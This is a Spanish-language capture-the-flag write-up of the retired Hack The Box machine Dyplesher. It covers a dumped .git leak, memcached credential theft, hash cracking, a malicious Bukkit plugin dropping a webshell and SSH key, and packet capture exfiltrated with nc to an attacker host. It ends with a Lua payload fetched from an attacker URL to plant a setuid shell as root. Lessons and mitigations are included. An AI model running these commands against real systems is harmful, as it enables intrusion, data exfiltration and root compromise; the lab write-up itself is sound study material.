---
machine: Dyplesher
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, git, memcached, gogs, minecraft, rabbitmq, privesc]
---

# Dyplesher — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El vhost `test.dyplesher.htb` expone un `.git` que contiene `index.php` y credenciales de memcached. El servicio `11211` solo acepta el protocolo binario con SASL; con un cliente compatible se leen los hashes de `MinatoTW`, `felamos` y `yuntao`. Uno se crackea y da acceso a Gogs, donde un release contiene bundles de repositorios. El repositorio de Minecraft incluye una base SQLite de LoginSecurity con otro hash, que lleva al panel de administración. Subiendo un plugin Bukkit malicioso se escribe una webshell y una clave SSH, lo que da acceso como `MinatoTW`. Su pertenencia al grupo `wireshark` permite capturar tráfico con `dumpcap`; del tráfico de RabbitMQ se obtienen credenciales de `felamos`. En su home, una nota describe el exchange `plugin_data`; publicando una URL a un plugin Lua se ejecuta código como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000,4369,5672,11211,25562,25565,25672 <IP>
```

- `22` OpenSSH 8.0p1.
- `80` Apache 2.4.41; `dyplesher.htb` y `test.dyplesher.htb`.
- `3000` Gogs.
- `4369`/`25672` Erlang/EPMD; `5672` RabbitMQ 3.7.8.
- `11211` memcached con autenticación.
- `25565` servicio Minecraft; `25562` sin identificar.

```bash
echo '<IP> dyplesher.htb test.dyplesher.htb' | sudo tee -a /etc/hosts
```

La web principal es la portada de un servidor Minecraft y enlaza al staff. `test` es un formulario que añade claves a memcached.

## Enumeración

`nmap -sC` contra `test.dyplesher.htb` detecta `/.git/`. Se vuelca con GitTools:

```bash
gitdumper.sh http://test.dyplesher.htb/.git/ ./git
cd git && git reset --hard
```

`index.php` usa `Memcached` con `OPT_BINARY_PROTOCOL` y `setSaslAuthData`, y revela las credenciales de memcached. El protocolo de texto no funciona; con `memcached-cli` o `memccat` se leen las claves `username`, `email` y `password`. Los hashes bcrypt se crackean con `hashcat -m 3200`; uno pertenece a `felamos`.

## Foothold

La contraseña de `felamos` funciona en Gogs. El repositorio `gitlab` tiene un release `repo.zip` con cuatro bundles; el único original es un servidor Minecraft con un plugin `LoginSecurity` y `users.db`. El hash de `users.db` se crackea y da la contraseña del panel de `dyplesher.htb`.

El panel permite subir y cargar plugins Bukkit. Se compila un plugin Java 8 con `onEnable()` que escribe un webshell PHP y una clave SSH:

```java
getLogger().info("plugin loaded");
// escribir /var/www/test/0xdf.php y /home/MinatoTW/.ssh/authorized_keys
```

Tras subirlo y cargarlo, la webshell responde como `MinatoTW` y la clave SSH permite un acceso estable.

## Movimiento lateral

`MinatoTW` pertenece al grupo `wireshark`; `/usr/bin/dumpcap` tiene `cap_net_admin,cap_net_raw`. Se captura tráfico de `docker0` y se exfiltra por un puerto permitido (5672 o 11211), porque el firewall bloquea el resto:

```bash
dumpcap -w /dev/shm/out.pcapng
cat /dev/shm/out.pcapng | nc <ATTACKER> 5672
```

En el PCAP aparecen el cron de memcached, el tráfico de Erlang y, cada dos minutos, una publicación AMQP con credenciales de `yuntao`/`felamos`. Con esas credenciales se entra por SSH como `felamos`.

## Escalada de privilegios

En la home de `felamos` hay un directorio `yuntao` con `send.sh`, que describe el exchange `plugin_data` y el flujo de revisión de plugins de Cuberite. Se publica una URL con `amqp-publish`:

```bash
amqp-publish --uri='amqp://<USER>:<PASS>@<IP>:5672' \
  --exchange plugin_data --body 'http://<ATTACKER>:11211/pwn.lua'
```

El plugin Lua se descarga y se ejecuta como root. Un `os.execute()` puede escribir una clave en `/root/.ssh/authorized_keys`, copiar `dash` con setuid o lanzar una reverse shell:

```lua
os.execute("cp /bin/dash /tmp/.pwn; chmod 4777 /tmp/.pwn")
```

Después, `/tmp/.pwn -p` da una shell con UID efectivo 0.

## Evidencia

- `/.git/` en `test.dyplesher.htb` y credenciales en `index.php`.
- Claves de memcached y hash bcrypt crackeado.
- `repo.zip`, `users.db` y acceso al panel.
- Plugin Bukkit cargado con webshell/clave SSH.
- `dumpcap` y PCAP con credenciales AMQP.
- `send.sh`, publicación en `plugin_data` y `/tmp/.pwn -p` como root.

## Lecciones aprendidas

- Un `.git` expuesto puede contener credenciales que no están en el código actual.
- Memcached con SASL exige el protocolo binario; el cliente de texto no sirve.
- Los repositorios y releases de Gogs pueden filtrar bases de datos y plugins.
- Un plugin de Minecraft es código que se ejecuta con los privilegios del servidor.
- La captura de tráfico puede revelar credenciales de servicios internos.

## Mitigaciones y detección

- No publicar `.git`, backups ni releases con datos de usuarios.
- Autenticar memcached y limitarlo a localhost; no usar credenciales compartidas.
- Revisar y firmar plugins antes de cargarlos; ejecutar el servidor Minecraft sin privilegios.
- Cifrar AMQP y restringir el exchange `plugin_data` a publicadores autenticados.
- Detectar plugins nuevos, escrituras en webroots, `dumpcap` inesperado y conexiones salientes a `5672`/`11211`.

## Referencias

- [0xdf — Dyplesher](https://0xdf.gitlab.io/2020/10/24/htb-dyplesher.html)
- [IppSec — Dyplesher](https://www.youtube.com/watch?v=F6oSpOWOjSQ)
- [Hack The Box — Dyplesher](https://app.hackthebox.com/machines/dyplesher)
